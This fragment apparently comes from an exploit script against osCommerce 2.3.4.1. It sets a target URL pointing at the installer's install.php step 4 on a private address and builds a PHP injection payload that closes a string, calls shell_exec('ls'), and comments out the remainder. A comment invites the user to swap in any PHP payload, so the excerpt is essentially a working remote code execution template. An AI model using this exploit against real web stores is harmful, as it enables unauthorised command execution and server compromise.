...
base_url = "http://10.10.2.21:8080//oscommerce-2.3.4.1/catalog/"
target_url = "http://10.10.2.21:8080/oscommerce-2.3.4.1/catalog/install/install.php?step=4"
...
payload = '\');'
payload += 'shell_exec("ls");'    # this is where you enter you PHP payload
payload += '/*'
